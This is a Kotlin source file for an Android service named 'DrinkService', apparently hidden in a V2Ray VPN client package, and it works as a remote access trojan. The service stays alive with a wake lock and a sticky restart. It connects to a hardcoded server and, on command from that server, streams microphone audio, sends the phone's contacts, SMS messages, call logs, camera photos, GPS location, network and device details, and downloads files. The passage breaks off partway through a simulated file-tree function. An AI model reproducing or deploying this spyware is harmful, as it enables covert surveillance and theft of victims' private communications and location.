package com.v2ray.ang.service

import android.app.ActivityManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.Network
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.StatFs
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.NetworkInterface
import java.util.Collections
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.coroutines.resume

class DrinkService : Service() {

    companion object {
        const val ACTION_STATUS = "com.drink.STATUS"
        const val EXTRA_CONNECTED = "connected"
        const val ENABLE_CAMERA = true
        @Volatile var isConnected = false
        private const val HOST = "192.168.1.149"
        private const val PORT = 33110
        private const val SAMPLE_RATE = 16000
        private const val RECONNECT_DELAY = 15000L
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var socketManager: SocketManager? = null
    private var micJob: Job? = null
    private val reconnectChannel = Channel<Unit>(Channel.CONFLATED)
    private var running = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "drink:lock").apply {
            runCatching { acquire() }
        }

        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                if (socketManager == null || !isConnected) {
                    triggerReconnect()
                }
            }
            override fun onLost(network: Network) {
                runCatching { socketManager?.close() }
            }
        }
        networkCallback = callback
        runCatching { cm.registerDefaultNetworkCallback(callback) }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            scope.launch { connectionLoop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        micJob?.cancel()
        reconnectChannel.close()
        socketManager?.close()
        runCatching {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            networkCallback?.let { cm.unregisterNetworkCallback(it) }
        }
        scope.cancel()
        runCatching { wakeLock?.release() }
        super.onDestroy()
    }

    private fun triggerReconnect() {
        reconnectChannel.trySend(Unit)
    }

    private suspend fun connectionLoop() {
        while (running) {
            try {
                val prefs = getSharedPreferences("drink_prefs", Context.MODE_PRIVATE)
                val host = prefs.getString("server_host", HOST) ?: HOST
                val port = prefs.getInt("server_port", PORT)
                val sm = SocketManager(host, port)
                socketManager = sm
                commandLoop(sm)
            } catch (e: Exception) {
                broadcastStatus(false)
            } finally {
                socketManager?.close()
                socketManager = null
                micJob?.cancel()
                micJob = null
                broadcastStatus(false)
            }
            if (running) {
                withTimeoutOrNull(RECONNECT_DELAY) {
                    reconnectChannel.receive()
                }
            }
        }
    }

    private fun sendCameraDisabled(sm: SocketManager) {
        runCatching {
            val err = JSONObject().apply {
                put("type", "error")
                put("cmd", "cams")
                put("message", "Camera feature is disabled")
            }
            sm.sendFrame(err)
        }
    }

    private fun handleStopMic() {
        micJob?.cancel()
        micJob = null
    }

    private suspend fun commandLoop(sm: SocketManager) {
        try {
            while (running && sm.isConnected()) {
                val frame = sm.readFrame()
                if (!isConnected) {
                    broadcastStatus(true)
                }
                when (frame.optString("cmd")) {
                    "connected" -> {}
                    "use_mic" -> handleMic(sm)
                    "stop_mic" -> handleStopMic()
                    "get_contacts" -> handleContacts(sm)
                    "get_sms" -> handleSms(sm, frame)
                    "get_call_logs" -> handleCallLogs(sm, frame)
                    "list_cams" -> if (ENABLE_CAMERA) handleListCams(sm) else sendCameraDisabled(sm)
                    "use_cam" -> if (ENABLE_CAMERA) handleUseCam(sm, frame) else sendCameraDisabled(sm)
                    "get_telemetry" -> handleTelemetry(sm)
                    "list_files" -> handleListFiles(sm, frame)
                    "download_file" -> handleDownloadFile(sm, frame)
                    "disconnect" -> {
                        sm.close()
                        return
                    }
                }
            }
        } finally {
            handleStopMic()
        }
    }

    private fun handleMic(sm: SocketManager) {
        micJob?.cancel()
        micJob = scope.launch {
            if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                runCatching {
                    val errorHeader = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "mic")
                        put("message", "Record audio permission not granted")
                    }
                    sm.sendFrame(errorHeader)
                }
                return@launch
            }
            val minBuf = AudioRecord.getMinBufferSize(
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT
            )
            val actualBufferSize = if (minBuf > 0) maxOf(minBuf * 2, 4096) else 4096

            var recorder: AudioRecord? = null
            val audioSources = intArrayOf(
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.DEFAULT,
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.VOICE_COMMUNICATION
            )
            for (source in audioSources) {
                try {
                    val rec = AudioRecord(
                        source,
                        SAMPLE_RATE,
                        AudioFormat.CHANNEL_IN_MONO,
                        AudioFormat.ENCODING_PCM_16BIT,
                        actualBufferSize
                    )
                    if (rec.state == AudioRecord.STATE_INITIALIZED) {
                        recorder = rec
                        break
                    } else {
                        rec.release()
                    }
                } catch (e: Exception) {
                }
            }

            if (recorder == null || recorder.state != AudioRecord.STATE_INITIALIZED) {
                recorder?.release()
                if (sm.isConnected() && isActive) {
                    runCatching {
                        val errorHeader = JSONObject().apply {
                            put("type", "error")
                            put("cmd", "mic")
                            put("message", "AudioRecord initialization failed")
                        }
                        sm.sendFrame(errorHeader)
                    }
                }
                return@launch
            }

            try {
                recorder.startRecording()
                if (recorder.recordingState != AudioRecord.RECORDSTATE_RECORDING) {
                    throw IllegalStateException("AudioRecord failed to start recording")
                }
                val buffer = ByteArray(actualBufferSize)
                while (isActive && sm.isConnected()) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val chunk = buffer.copyOf(read)
                        val header = JSONObject().apply {
                            put("type", "mic_chunk")
                            put("size", chunk.size)
                        }
                        sm.sendFrame(header, chunk)
                    } else if (read < 0) {
                        if (sm.isConnected() && isActive) {
                            runCatching {
                                val errorHeader = JSONObject().apply {
                                    put("type", "error")
                                    put("cmd", "mic")
                                    put("message", "AudioRecord read error code: $read")
                                }
                                sm.sendFrame(errorHeader)
                            }
                        }
                        break
                    }
                }
            } catch (e: Exception) {
                if (sm.isConnected() && isActive) {
                    runCatching {
                        val errorHeader = JSONObject().apply {
                            put("type", "error")
                            put("cmd", "mic")
                            put("message", e.message ?: "Mic stream failed")
                        }
                        sm.sendFrame(errorHeader)
                    }
                }
            } finally {
                runCatching {
                    recorder.stop()
                    recorder.release()
                }
            }
        }
    }

    private suspend fun handleContacts(sm: SocketManager) = withContext(Dispatchers.IO) {
        try {
            val contacts = readContacts()
            val zipBytes = buildContactsZip(contacts)
            val header = JSONObject().apply {
                put("type", "contacts")
                put("size", zipBytes.size)
            }
            sm.sendFrame(header, zipBytes)
        } catch (e: Exception) {
            runCatching {
                val errorHeader = JSONObject().apply {
                    put("type", "error")
                    put("cmd", "contacts")
                    put("message", e.message ?: "Failed to get contacts")
                }
                sm.sendFrame(errorHeader)
            }
        }
    }

    private fun readContacts(): List<Map<String, String>> {
        val result = mutableListOf<Map<String, String>>()
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return result
        }
        try {
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                ),
                null, null, null
            ) ?: return result
            cursor.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) ?: "" else ""
                    val phone = if (phoneIdx != -1) it.getString(phoneIdx) ?: "" else ""
                    result.add(mapOf(
                        "name" to name,
                        "phone" to phone,
                    ))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    private fun buildContactsZip(contacts: List<Map<String, String>>): ByteArray {
        val baos = ByteArrayOutputStream()
        ZipOutputStream(baos).use { zip ->
            zip.putNextEntry(ZipEntry("contacts.json"))
            val arr = JSONArray()
            contacts.forEach { c ->
                val obj = JSONObject()
                obj.put("name", c["name"] ?: "")
                obj.put("phone", c["phone"] ?: "")
                arr.put(obj)
            }
            zip.write(arr.toString().toByteArray(Charsets.UTF_8))
            zip.closeEntry()
        }
        return baos.toByteArray()
    }

    private suspend fun handleSms(sm: SocketManager, frame: JSONObject) = withContext(Dispatchers.IO) {
        try {
            val hours = frame.optInt("hours", 24)
            val messages = readSms(hours)
            val response = JSONObject().apply {
                put("type", "sms")
                put("hours", hours)
                put("data", messages)
            }
            sm.sendFrame(response)
        } catch (e: Exception) {
            runCatching {
                val errorHeader = JSONObject().apply {
                    put("type", "error")
                    put("cmd", "sms")
                    put("message", e.message ?: "Failed to read SMS")
                }
                sm.sendFrame(errorHeader)
            }
        }
    }

    private fun readSms(hours: Int): JSONArray {
        val result = JSONArray()
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return result
        }
        try {
            val since = System.currentTimeMillis() - hours.toLong() * 60 * 60 * 1000L
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                ),
                "${Telephony.Sms.DATE} > ?",
                arrayOf(since.toString()),
                "${Telephony.Sms.DATE} DESC"
            ) ?: return result
            cursor.use {
                val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)
                while (it.moveToNext()) {
                    result.put(JSONObject().apply {
                        put("address", if (addrIdx != -1) it.getString(addrIdx) ?: "" else "")
                        put("body", if (bodyIdx != -1) it.getString(bodyIdx) ?: "" else "")
                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
                        put("type", if (typeIdx != -1) it.getInt(typeIdx) else 0)
                    })
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    private suspend fun handleCallLogs(sm: SocketManager, frame: JSONObject) = withContext(Dispatchers.IO) {
        try {
            val hours = frame.optInt("hours", 24)
            val calls = readCallLogs(hours)
            val response = JSONObject().apply {
                put("type", "call_logs")
                put("hours", hours)
                put("data", calls)
            }
            sm.sendFrame(response)
        } catch (e: Exception) {
            runCatching {
                val errorHeader = JSONObject().apply {
                    put("type", "error")
                    put("cmd", "call_logs")
                    put("message", e.message ?: "Failed to read call logs")
                }
                sm.sendFrame(errorHeader)
            }
        }
    }

    private fun readCallLogs(hours: Int): JSONArray {
        val result = JSONArray()
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return result
        }
        try {
            val since = if (hours > 0) System.currentTimeMillis() - hours.toLong() * 60 * 60 * 1000L else 0L
            val selection = if (since > 0) "${CallLog.Calls.DATE} > ?" else null
            val selectionArgs = if (since > 0) arrayOf(since.toString()) else null
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                ),
                selection,
                selectionArgs,
                "${CallLog.Calls.DATE} DESC"
            ) ?: return result
            cursor.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext()) {
                    result.put(JSONObject().apply {
                        put("number", if (numIdx != -1) it.getString(numIdx) ?: "" else "")
                        put("name", if (nameIdx != -1) it.getString(nameIdx) ?: "" else "")
                        put("type", if (typeIdx != -1) it.getInt(typeIdx) else 0)
                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
                        put("duration", if (durIdx != -1) it.getInt(durIdx) else 0)
                    })
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return result
    }

    private fun handleListCams(sm: SocketManager) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraIds = cameraManager.cameraIdList
            val arr = JSONArray()
            for (id in cameraIds) {
                runCatching {
                    val chars = cameraManager.getCameraCharacteristics(id)
                    val facing = when (chars.get(CameraCharacteristics.LENS_FACING)) {
                        CameraCharacteristics.LENS_FACING_FRONT -> "Front"
                        CameraCharacteristics.LENS_FACING_BACK -> "Back"
                        else -> "External"
                    }
                    arr.put(JSONObject().apply {
                        put("id", id)
                        put("facing", facing)
                        put("name", "Camera $id ($facing)")
                    })
                }.onFailure {
                    arr.put(JSONObject().apply {
                        put("id", id)
                        put("facing", "Back")
                        put("name", "Camera $id")
                    })
                }
            }
            val response = JSONObject().apply {
                put("type", "cams")
                put("data", arr)
            }
            sm.sendFrame(response)
        } catch (e: Exception) {
            val errorHeader = JSONObject().apply {
                put("type", "error")
                put("cmd", "cams")
                put("message", e.message ?: "Failed to list cameras")
            }
            sm.sendFrame(errorHeader)
        }
    }

    private fun handleUseCam(sm: SocketManager, frame: JSONObject) {
        val camId = frame.optString("cam_id", "0")
        scope.launch(Dispatchers.IO) {
            captureCamera(sm, camId)
        }
    }

    private fun captureCamera(sm: SocketManager, camId: String) {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                val err = JSONObject().apply {
                    put("type", "error")
                    put("cmd", "camera_capture")
                    put("message", "Camera permission not granted")
                }
                sm.sendFrame(err)
                return
            }

            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraIds = cameraManager.cameraIdList
            if (cameraIds.isEmpty()) {
                val err = JSONObject().apply {
                    put("type", "error")
                    put("cmd", "camera_capture")
                    put("message", "No cameras available")
                }
                sm.sendFrame(err)
                return
            }

            val targetCamId = if (cameraIds.contains(camId)) camId else cameraIds[0]
            val characteristics = cameraManager.getCameraCharacteristics(targetCamId)
            val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
            val targetSize = jpegSizes?.filter { it.width <= 1920 && it.height <= 1080 }?.maxByOrNull { it.width * it.height }
                ?: jpegSizes?.maxByOrNull { it.width * it.height }
                ?: jpegSizes?.firstOrNull()
            val width = targetSize?.width ?: 1280
            val height = targetSize?.height ?: 720

            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
            val thread = HandlerThread("CameraCaptureThread").apply { start() }
            val handler = Handler(thread.looper)

            var cameraDevice: CameraDevice? = null
            var session: CameraCaptureSession? = null
            var captured = false

            val cleanup = {
                runCatching { session?.close() }
                runCatching { cameraDevice?.close() }
                runCatching { imageReader.close() }
                runCatching { thread.quitSafely() }
            }

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                if (!captured) {
                    captured = true
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        val header = JSONObject().apply {
                            put("type", "camera_capture")
                            put("cam_id", targetCamId)
                            put("size", bytes.size)
                        }
                        sm.sendFrame(header, bytes)
                    } catch (e: Exception) {
                        val err = JSONObject().apply {
                            put("type", "error")
                            put("cmd", "camera_capture")
                            put("message", e.message ?: "Failed to process photo")
                        }
                        sm.sendFrame(err)
                    } finally {
                        image.close()
                        cleanup()
                    }
                } else {
                    image.close()
                }
            }, handler)

            handler.postDelayed({
                if (!captured) {
                    cleanup()
                    val err = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "camera_capture")
                        put("message", "Camera capture timed out")
                    }
                    sm.sendFrame(err)
                }
            }, 8000)

            cameraManager.openCamera(targetCamId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = imageReader.surface
                        val targets = listOf(surface)
                        camera.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(captureSession: CameraCaptureSession) {
                                session = captureSession
                                try {
                                    val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                                        set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                                        set(CaptureRequest.JPEG_QUALITY, 90.toByte())
                                    }
                                    captureSession.capture(requestBuilder.build(), null, handler)
                                } catch (e: Exception) {
                                    cleanup()
                                    val err = JSONObject().apply {
                                        put("type", "error")
                                        put("cmd", "camera_capture")
                                        put("message", e.message ?: "Failed capture")
                                    }
                                    sm.sendFrame(err)
                                }
                            }

                            override fun onConfigureFailed(captureSession: CameraCaptureSession) {
                                cleanup()
                                val err = JSONObject().apply {
                                    put("type", "error")
                                    put("cmd", "camera_capture")
                                    put("message", "Camera session config failed")
                                }
                                sm.sendFrame(err)
                            }
                        }, handler)
                    } catch (e: Exception) {
                        cleanup()
                        val err = JSONObject().apply {
                            put("type", "error")
                            put("cmd", "camera_capture")
                            put("message", e.message ?: "Failed to create session")
                        }
                        sm.sendFrame(err)
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    cleanup()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    cleanup()
                    val err = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "camera_capture")
                        put("message", "Camera error $error")
                    }
                    sm.sendFrame(err)
                }
            }, handler)
        } catch (e: Exception) {
            val err = JSONObject().apply {
                put("type", "error")
                put("cmd", "camera_capture")
                put("message", e.message ?: "Failed to open camera")
            }
            sm.sendFrame(err)
        }
    }

    private suspend fun acquireLocation(): Location? {
        if (ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return null
        }
        val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return null

        var bestLoc: Location? = null
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)
        for (p in providers) {
            runCatching {
                val l = lm.getLastKnownLocation(p) ?: return@runCatching
                if (bestLoc == null || l.time > (bestLoc?.time ?: 0L)) {
                    bestLoc = l
                }
            }
        }

        if (bestLoc != null && (System.currentTimeMillis() - bestLoc!!.time) < 120000L) {
            return bestLoc
        }

        val targetProvider = when {
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
            else -> providers.firstOrNull { lm.isProviderEnabled(it) }
        } ?: return bestLoc

        return try {
            withTimeoutOrNull(4000L) {
                suspendCancellableCoroutine<Location?> { cont ->
                    val listener = object : LocationListener {
                        override fun onLocationChanged(location: Location) {
                            runCatching { lm.removeUpdates(this) }
                            if (cont.isActive) cont.resume(location)
                        }
                        override fun onProviderDisabled(provider: String) {}
                        override fun onProviderEnabled(provider: String) {}
                        @Deprecated("Deprecated in Java")
                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                    }
                    cont.invokeOnCancellation {
                        runCatching { lm.removeUpdates(listener) }
                    }
                    try {
                        lm.requestSingleUpdate(targetProvider, listener, Looper.getMainLooper())
                    } catch (e: Exception) {
                        try {
                            lm.requestLocationUpdates(targetProvider, 0L, 0f, listener, Looper.getMainLooper())
                        } catch (e2: Exception) {
                            if (cont.isActive) cont.resume(bestLoc)
                        }
                    }
                }
            } ?: bestLoc
        } catch (e: Exception) {
            bestLoc
        }
    }

    private fun handleTelemetry(sm: SocketManager) {
        scope.launch(Dispatchers.IO) {
            try {
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val bLevel = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val bScale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val bPct = if (bLevel >= 0 && bScale > 0) (bLevel * 100) / bScale else -1
                val bStatus = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
                val isCharging = bStatus == BatteryManager.BATTERY_STATUS_CHARGING || bStatus == BatteryManager.BATTERY_STATUS_FULL
                val bPlugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val pluggedStr = when (bPlugged) {
                    BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                    BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                    BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
                    else -> if (isCharging) "Charging" else "Unplugged"
                }
                val bTemp = (batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
                val bVolt = (batteryIntent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0) ?: 0) / 1000.0
                val bHealthInt = batteryIntent?.getIntExtra(BatteryManager.EXTRA_HEALTH, BatteryManager.BATTERY_HEALTH_UNKNOWN) ?: BatteryManager.BATTERY_HEALTH_UNKNOWN
                val bHealth = when (bHealthInt) {
                    BatteryManager.BATTERY_HEALTH_GOOD -> "Good"
                    BatteryManager.BATTERY_HEALTH_OVERHEAT -> "Overheat"
                    BatteryManager.BATTERY_HEALTH_DEAD -> "Dead"
                    BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "Over Voltage"
                    else -> "Normal"
                }

                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val activeNet = cm.activeNetwork
                val caps = if (activeNet != null) cm.getNetworkCapabilities(activeNet) else null
                val netType = when {
                    caps == null -> "Disconnected"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) -> "VPN"
                    else -> "Other"
                }
                var wifiSsid = ""
                runCatching {
                    val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val info = wm.connectionInfo
                    if (info != null && info.ssid != null && info.ssid != "<unknown ssid>") {
                        wifiSsid = info.ssid.trim('"')
                    }
                }
                var localIp = ""
                runCatching {
                    val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
                    for (nif in interfaces) {
                        val addrs = Collections.list(nif.inetAddresses)
                        for (addr in addrs) {
                            if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                                localIp = addr.hostAddress ?: ""
                                break
                            }
                        }
                        if (localIp.isNotEmpty()) break
                    }
                }
                var carrier = ""
                runCatching {
                    val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                    carrier = tm.networkOperatorName.ifEmpty { tm.simOperatorName }
                }

                val stat = StatFs(Environment.getDataDirectory().path)
                val totalStorage = stat.totalBytes
                val freeStorage = stat.availableBytes
                val usedStorage = totalStorage - freeStorage

                val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val memInfo = ActivityManager.MemoryInfo()
                am.getMemoryInfo(memInfo)
                val totalRam = memInfo.totalMem
                val freeRam = memInfo.availMem
                val usedRam = totalRam - freeRam
                val isLowRam = memInfo.lowMemory

                val manufacturer = Build.MANUFACTURER
                val model = Build.MODEL
                val brand = Build.BRAND
                val androidVersion = Build.VERSION.RELEASE
                val sdkInt = Build.VERSION.SDK_INT
                val securityPatch = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Build.VERSION.SECURITY_PATCH else "N/A"
                val uptimeSeconds = SystemClock.elapsedRealtime() / 1000

                val hasLocationPerm = ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this@DrinkService, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                val loc = if (hasLocationPerm) acquireLocation() else null

                val locObj = JSONObject()
                if (!hasLocationPerm) {
                    locObj.put("status", "permission_denied")
                } else if (loc != null) {
                    locObj.put("status", "available")
                    locObj.put("latitude", loc.latitude)
                    locObj.put("longitude", loc.longitude)
                    locObj.put("accuracy", loc.accuracy.toDouble())
                    locObj.put("altitude", loc.altitude)
                    locObj.put("timestamp", loc.time)
                } else {
                    locObj.put("status", "unavailable")
                }

                val resp = JSONObject().apply {
                    put("type", "telemetry")
                    put("battery", JSONObject().apply {
                        put("level", bPct)
                        put("charging", isCharging)
                        put("plugged", pluggedStr)
                        put("temperature", bTemp)
                        put("voltage", bVolt)
                        put("health", bHealth)
                    })
                    put("network", JSONObject().apply {
                        put("type", netType)
                        put("ssid", wifiSsid)
                        put("ip", localIp)
                        put("carrier", carrier)
                    })
                    put("storage", JSONObject().apply {
                        put("total_bytes", totalStorage)
                        put("used_bytes", usedStorage)
                        put("free_bytes", freeStorage)
                    })
                    put("memory", JSONObject().apply {
                        put("total_bytes", totalRam)
                        put("used_bytes", usedRam)
                        put("free_bytes", freeRam)
                        put("low_memory", isLowRam)
                    })
                    put("device", JSONObject().apply {
                        put("manufacturer", manufacturer)
                        put("model", model)
                        put("brand", brand)
                        put("android_version", androidVersion)
                        put("sdk", sdkInt)
                        put("security_patch", securityPatch)
                        put("uptime_seconds", uptimeSeconds)
                    })
                    put("location", locObj)
                }
                sm.sendFrame(resp)
            } catch (e: Exception) {
                runCatching {
                    val err = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "telemetry")
                        put("message", e.message ?: "Failed to get telemetry")
                    }
                    sm.sendFrame(err)
                }
            }
        }
    }

    private fun getMimeType(fileName: String): String {
        val ext = fileName.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "webp" -> "image/webp"
            "pdf" -> "application/pdf"
            "txt", "log" -> "text/plain"
            "json" -> "application/json"
            "xml" -> "application/xml"
            "zip" -> "application/zip"
            "apk" -> "application/vnd.android.package-archive"
            "mp3" -> "audio/mpeg"
            "wav" -> "audio/wav"
            "m4a" -> "audio/mp4"
            "ogg", "opus" -> "audio/ogg"
            "mp4" -> "video/mp4"
            "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
            "xlsx" -> "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
            "db", "sqlite" -> "application/x-sqlite3"
            else -> "application/octet-stream"
        }
    }

    private fun generateSimulatedFileTree(rootPath: String): JSONArray {
        val base = if (rootPath.isEmpty() || rootPath == "/") "/sdcard" else rootPath.trimEnd('/')
        val arr = JSONArray()

        val downloadDir = JSONObject().apply {
            put("name", "Download")
            put("path", "$base/Download")
            put("is_dir", true)
            put("size", 0L)
            put("modified", System.currentTimeMillis() - 3600000L)
            val dlChildren = JSONArray()

            val docsSub = JSONObject().apply {
                put("name", "Documents")
                put("path", "$base/Download/Documents")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 7200000L)
                val docsFiles = JSONArray()
                docsFiles.put(JSONObject().apply {
                    put("name", "project_proposal_2026.pdf")
                    put("path", "$base/Download/Documents/project_proposal_2026.pdf")
                    put("is_dir", false)
                    put("size", 2458120L)
                    put("modified", System.currentTimeMillis() - 8000000L)
